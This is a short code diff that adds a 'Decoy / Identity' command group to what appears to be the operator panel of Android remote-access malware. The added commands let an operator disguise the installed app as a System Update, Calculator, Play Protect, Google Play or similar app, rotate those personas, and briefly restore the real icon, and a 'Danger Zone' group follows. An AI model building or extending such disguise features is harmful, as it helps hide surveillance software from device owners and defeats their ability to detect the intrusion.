@@ -203,6 +203,17 @@ const CMD_CATALOG = [
     ]
   },
   {
+    cat: 'Decoy / Identity',
+    color: '#446688',
+    icon: '🎭',
+    cmds: [
+      { cmd: 'DECOY_SWITCH',   label: 'Switch Persona',  args: [{ key:'persona', def:'1', type:'number', hint:'1=SysUpdate 2=Calc 3=Weather 4=PlayProtect 5=GooglePlay 6=FileMgr' }] },
+      { cmd: 'DECOY_STATUS',   label: 'Decoy Status' },
+      { cmd: 'DECOY_ROTATE',   label: 'Rotate Persona' },
+      { cmd: 'DECOY_RESTORE',  label: 'Restore Real Icon (60s)' },
+    ]
+  },
+  {
     cat: 'Danger Zone',
     color: '#e05c5c',
     icon: '💀',
